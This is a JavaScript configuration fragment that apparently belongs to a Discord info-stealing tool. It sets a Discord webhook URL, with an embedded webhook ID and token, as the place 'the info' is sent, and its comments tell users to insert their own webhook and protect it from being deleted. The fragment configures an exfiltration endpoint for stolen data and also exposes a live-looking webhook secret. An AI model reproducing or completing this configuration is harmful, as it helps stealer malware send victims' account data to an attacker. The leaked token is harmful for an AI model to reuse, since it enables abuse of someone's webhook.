...
const config = {
  webhook: 'https://discord.com/api/webhooks/1062087195634184192/VrNvHN0CYNP2e0-6_LJ-gOZqXNXuYesqsYJYhFxsHQ_FCvQlS2VyvYXT-lPJJGWa8UQ0', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
  ...
  embed_name: 'sx', //name of the webhook thats gonna send the info
